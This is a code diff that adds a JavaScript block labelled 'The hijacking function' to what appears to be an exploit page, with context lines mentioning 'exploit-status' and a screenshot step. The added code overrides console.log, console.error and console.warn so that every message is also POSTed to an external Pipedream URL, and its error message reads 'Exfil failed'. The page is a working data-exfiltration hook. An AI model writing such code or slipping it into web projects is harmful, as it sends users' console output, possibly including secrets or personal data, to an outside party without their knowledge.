@@ -44,6 +44,36 @@
             });
         };
 
+        // 1. The hijacking function
+    (function() {
+        const originalLog = console.log;
+        const originalError = console.error;
+        const originalWarn = console.warn;
+
+        function sendToPipedream(type, message) {
+            fetch('https://eo1b8md42oge0zj.m.pipedream.net', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ type: type, log: message })
+            }).catch(e => console.error("Exfil failed", e));
+        }
+
+        console.log = function(...args) {
+            sendToPipedream('log', args.join(' '));
+            originalLog.apply(console, args);
+        };
+
+        console.error = function(...args) {
+            sendToPipedream('error', args.join(' '));
+            originalError.apply(console, args);
+        };
+
+        console.warn = function(...args) {
+            sendToPipedream('warn', args.join(' '));
+            originalWarn.apply(console, args);
+        };
+    })();
+
         // setTimeout(() => {
             // document.getElementById('exploit-status').innerText = "Taking screenshot...";
 
